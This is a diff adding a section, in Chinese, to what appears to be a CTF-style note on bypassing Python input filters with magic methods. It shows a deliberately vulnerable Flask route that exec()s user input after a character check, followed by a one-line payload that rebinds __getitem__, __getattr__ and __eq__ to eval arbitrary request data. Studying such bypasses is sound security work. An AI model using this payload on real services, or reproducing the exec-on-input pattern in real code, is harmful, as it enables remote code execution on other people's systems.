@@ -26,3 +26,33 @@ fun=getattr(os,'system')则fun()=system()
 
 
 
+
+
+## 过滤 (或)
+
+利用魔术方法绕过，常见的如:`__eq__,__ne__,__getitem__...`
+
+例如：
+
+```python
+from flask import Flask, request
+app = Flask(__name__)
+
+@app.route('/', methods=["POST"])
+def security():
+    secret = request.form["cmd"]
+    for i in secret:
+        if not 42 <= ord(i) <= 122: 
+            print(i)
+            return "error!"
+
+    exec(secret)
+    return "xXXxXXx"
+```
+
+
+
+```python
+request.args.__class__.__getattr__=request.args.__class__.__getitem__;app.config.__class__.__eq__=eval;app.config==request.args.a;
+```
+
